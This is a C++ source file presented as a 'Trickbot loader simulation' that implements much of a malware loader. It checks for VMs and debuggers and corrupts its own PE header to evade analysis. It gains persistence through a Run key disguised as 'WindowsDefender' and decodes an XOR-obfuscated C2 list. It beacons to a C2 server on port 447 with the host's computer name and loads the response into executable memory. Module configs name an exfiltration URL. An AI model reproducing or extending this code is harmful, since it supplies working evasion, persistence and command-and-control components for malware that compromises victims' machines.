/**
 * trick_main.cpp - Trickbot Loader Simulation
 * Implements the modular architecture with anti-analysis protections
 */
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>
#include "trick_config.h"
#ifdef _MSC_VER
#pragma comment(lib, "winhttp.lib")
#endif

// External functions
extern const char* GetAntiDebugScript();
extern void CorruptPEHeader();
extern BOOL IsBeingDebugged_Timing();
extern BOOL HasHardwareBreakpoints();
extern BOOL IsVirtualMachine();
extern BOOL DetectNtdllHooks();
BOOL InstallWebInjects();

/**
 * Module Loader Structure
 * Trickbot downloads modules from C2 and loads them reflectively
 */
typedef struct {
    DWORD moduleId;
    DWORD moduleSize;
    BYTE* moduleData;
    char moduleName[32];
} TRICK_MODULE;

typedef BOOL (*TrickModuleHandler)(const char* configXml);

typedef struct {
    DWORD moduleHash;
    DWORD moduleId;
    const char* moduleName;
    const char* configXml;
    TrickModuleHandler handler;
} TRICK_MODULE_DESCRIPTOR;

static DWORD Djb2HashA(const char* value) {
    DWORD hash = 5381;
    while (*value) {
        hash = ((hash << 5) + hash) + (BYTE)*value++;
    }
    return hash;
}

static void ParseModuleConfigTag(const char* xml, const char* tag, char* output, size_t outputSize) {
    char openTag[64];
    char closeTag[64];
    const char* start;
    const char* end;
    size_t length;

    wsprintfA(openTag, "<%s>", tag);
    wsprintfA(closeTag, "</%s>", tag);
    start = strstr(xml, openTag);
    if (!start) {
        output[0] = '\0';
        return;
    }

    start += lstrlenA(openTag);
    end = strstr(start, closeTag);
    if (!end) {
        output[0] = '\0';
        return;
    }

    length = (size_t)(end - start);
    if (length + 1 > outputSize) {
        length = outputSize - 1;
    }
    memcpy(output, start, length);
    output[length] = '\0';
}

static BOOL StageSystemInfoModule(const char* configXml) {
    char server[96];
    char port[16];
    HKEY hKey;

    ParseModuleConfigTag(configXml, "server", server, sizeof(server));
    ParseModuleConfigTag(configXml, "port", port, sizeof(port));
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Trickbot",
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemInfoServer", 0, REG_SZ, (BYTE*)server, lstrlenA(server) + 1);
        RegSetValueExA(hKey, "SystemInfoPort", 0, REG_SZ, (BYTE*)port, lstrlenA(port) + 1);
        RegCloseKey(hKey);
    }
    return TRUE;
}

static BOOL StageWebInjectModule(const char* configXml) {
    char target[128];
    ParseModuleConfigTag(configXml, "inject_target", target, sizeof(target));
    InstallWebInjects();
    if (target[0]) {
        HKEY hKey;
        if (RegCreateKeyExA(HKEY_CURRENT_USER,
                            "Software\\Microsoft\\Internet Explorer\\International",
                            0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "InjectTarget", 0, REG_SZ, (BYTE*)target, lstrlenA(target) + 1);
            RegCloseKey(hKey);
        }
    }
    return TRUE;
}

static BOOL StageNetworkModule(const char* configXml) {
    char exfilUrl[128];
    HKEY hKey;
    ParseModuleConfigTag(configXml, "exfil_url", exfilUrl, sizeof(exfilUrl));
    if (exfilUrl[0] && RegCreateKeyExA(HKEY_CURRENT_USER,
                                       "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Trickbot",
                                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "NetworkExfilUrl", 0, REG_SZ, (BYTE*)exfilUrl, lstrlenA(exfilUrl) + 1);
        RegCloseKey(hKey);
    }
    return TRUE;
}

static void DispatchConfiguredModules() {
    static const TRICK_MODULE_DESCRIPTOR descriptors[] = {
        {
            0x0FE759BEu,
            MODULE_INJECTDLL,
            "injectdll",
            "<module><inject_target>explorer.exe</inject_target><server>198.51.100.44</server><port>447</port></module>",
            StageWebInjectModule,
        },
        {
            0xC8AF700Bu,
            MODULE_NETWORKDLL,
            "networkdll",
            "<module><server>198.51.100.44</server><port>447</port><exfil_url>https://198.51.100.44/report</exfil_url></module>",
            StageNetworkModule,
        },
        {
            0x0BBD8ED6u,
            MODULE_SYSTEMINFO,
            "systeminfo",
            "<module><server>198.51.100.44</server><port>447</port></module>",
            StageSystemInfoModule,
        },
    };

    for (int i = 0; i < (int)(sizeof(descriptors) / sizeof(descriptors[0])); i++) {
        if (Djb2HashA(descriptors[i].moduleName) == descriptors[i].moduleHash && descriptors[i].handler) {
            descriptors[i].handler(descriptors[i].configXml);
        }
    }
}

/**
 * Decrypt C2 server list
 * Real Trickbot uses custom RC4 variant
 */
void DecryptC2Servers(char* outputBuffer, int maxServers) {
    BYTE key = 0x6B;  // Derived from build timestamp
    for (size_t i = 0; i < sizeof(ENC_C2_SERVERS) && (i / 16) < (size_t)maxServers; i++) {
        if (i % 16 == 0) {
            // Format as IP address
            sprintf(&outputBuffer[(i / 16) * 32], "%d.%d.%d.%d",
                    ENC_C2_SERVERS[i] ^ key,
                    ENC_C2_SERVERS[i + 1] ^ (key + 1),
                    ENC_C2_SERVERS[i + 2] ^ (key + 2),
                    ENC_C2_SERVERS[i + 3] ^ (key + 3));
        }
    }
}

/**
 * C2 Communication
 * Trickbot uses HTTPS with custom encryption
 */
BOOL TrickbotC2Checkin(const char* c2Server, TRICK_MODULE* modules, int* moduleCount) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;
    
    WCHAR szHost[64];
    MultiByteToWideChar(CP_ACP, 0, c2Server, -1, szHost, 64);
    
    HINTERNET hConnect = WinHttpConnect(hSession, szHost, 447, 0);  // Trickbot uses 447/449
    if (hConnect) {
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/ga/", NULL, NULL, NULL,
                                                 WINHTTP_FLAG_SECURE);
        if (hRequest) {
            // Build bot info packet (Trickbot format)
            char botInfo[512];
            char computerName[64];
            DWORD size = sizeof(computerName);
            GetComputerNameA(computerName, &size);
            
            // Trickbot sends: /[group]/[bot_id]/[command]/[data]
            sprintf(botInfo, "/%s/%s_%s_%lu/%d/",
                    "onl",  // Group identifier
                    computerName,
                    "WIN10PRO",
                    (unsigned long)GetTickCount(),
                    0x66);  // Command: get modules
            
            WinHttpSendRequest(hRequest, L"Content-Type: application/octet-stream\r\n", -1,
                               botInfo, strlen(botInfo), strlen(botInfo), 0);
            WinHttpReceiveResponse(hRequest, NULL);
            
            BYTE response[65536];
            DWORD bytesRead = 0;
            WinHttpReadData(hRequest, response, sizeof(response), &bytesRead);
            
            // Parse module response
            // Real Trickbot returns encrypted PE files with module ID header
            if (bytesRead > 0x1000) {
                *moduleCount = 1;
                modules[0].moduleId = MODULE_SYSTEMINFO;
                modules[0].moduleSize = bytesRead;
                modules[0].moduleData = (BYTE*)VirtualAlloc(NULL, bytesRead,
                                                             MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                memcpy(modules[0].moduleData, response, bytesRead);
            }
            
            WinHttpCloseHandle(hRequest);
        }
        WinHttpCloseHandle(hConnect);
    }
    WinHttpCloseHandle(hSession);
    
    return (*moduleCount > 0);
}

/**
 * Web Inject Hook Installation
 * Trickbot hooks browser APIs to inject fake banking forms
 */
BOOL InstallWebInjects() {
    // Real Trickbot hooks InternetConnect, HttpOpenRequest, etc.
    // This simulation shows the structure
    
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Internet Explorer\\International",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        // Store inject configuration
        RegSetValueExA(hKey, "AcceptLanguage", 0, REG_SZ,
                       (BYTE*)"en-US,en;q=0.9", 15);
        RegCloseKey(hKey);
    }
    
    return TRUE;
}

/**
 * Main Entry Point
 */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    // Multi-layer anti-analysis
    if (IsVirtualMachine()) {
        // Execute decoy behavior
        Sleep(60000);
        return 0;
    }
    
    if (IsBeingDebugged_Timing() || HasHardwareBreakpoints() || DetectNtdllHooks()) {
        // Corrupt memory to crash debugger
        CorruptPEHeader();
        __debugbreak();  // Will crash if no debugger attached
    }
    
    // Corrupt PE header in memory to hinder dumping
    CorruptPEHeader();
    
    // Persistence via Registry (Trickbot uses multiple methods)
    HKEY hKey;
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, "WindowsDefender", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
    RegCloseKey(hKey);
    
    // Decrypt C2 servers
    char c2Servers[2][32];
    DecryptC2Servers((char*)c2Servers, 2);
    
    // Download and execute modules
    TRICK_MODULE modules[16];
    int moduleCount = 0;
    
    for (int i = 0; i < 2; i++) {
        if (TrickbotC2Checkin(c2Servers[i], modules, &moduleCount)) {
            break;
        }
        Sleep(30000);  // Backoff between C2 attempts
    }
    
    // Load downloaded modules
    for (int i = 0; i < moduleCount; i++) {
        // Real Trickbot uses reflective DLL injection
        if (modules[i].moduleId == MODULE_WEBINJECTS) {
            InstallWebInjects();
        }
    }
    DispatchConfiguredModules();
    
    // Stay resident
    while (TRUE) {
        Sleep(600000);  // 10 minute beacon
    }
    
    return 0;
}
